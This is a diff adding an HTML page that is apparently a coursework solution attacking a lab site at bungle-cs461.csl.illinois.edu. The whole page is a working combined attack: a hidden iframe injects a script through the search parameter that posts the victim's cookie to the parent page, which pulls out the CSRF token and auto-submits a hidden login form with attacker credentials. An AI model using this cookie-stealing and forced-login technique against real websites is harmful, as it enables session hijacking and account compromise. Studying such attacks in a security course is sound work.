@@ -1,0 +1,39 @@
+<html>
+
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+
+<body style="display: none;">
+    <iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>
+    <iframe 
+        width="0" 
+        height="0" 
+        border="0" 
+        name="csrf-token-getter" 
+        id="csrf-token-getter"
+        src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=<script>window.parent.postMessage(document.cookie,'*')</script>"
+    ></iframe>
+    <form id="form" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post"
+        target="dummyframe">
+        <input id="username" name="username" value="attacker" />
+        <input id="userpass" name="password" value="l33th4x" />
+        <input id="csrf_token" name="csrf_token" value="" />
+    </form>
+</body>
+<footer>
+    <script>
+        
+        function receiveCookie(event) {
+            const cookie = event.data;
+            console.log(cookie);
+            const token = cookie.split(";",1)[0].split("=")[1]
+            console.log(token)
+            $('#csrf_token').val(token)
+            $('#form').submit();
+        }
+        window.addEventListener("message", receiveCookie)
+    </script>
+</footer>
+
+</html>
